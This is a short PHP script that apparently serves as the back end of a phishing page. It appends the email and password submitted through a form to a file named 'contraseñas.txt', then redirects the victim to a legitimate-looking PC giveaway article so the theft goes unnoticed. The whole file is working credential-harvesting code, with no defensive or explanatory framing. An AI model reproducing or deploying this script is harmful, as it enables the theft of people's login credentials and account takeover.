<?php
file_put_contents("contraseñas.txt", "Usuario: " .$_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location : https://www.profesionalreview.com/2019/01/27/sorteo-pc-gaming-amd-ryzen-threadripper-1950x-gaming-box-gtx-1070/');
exit();
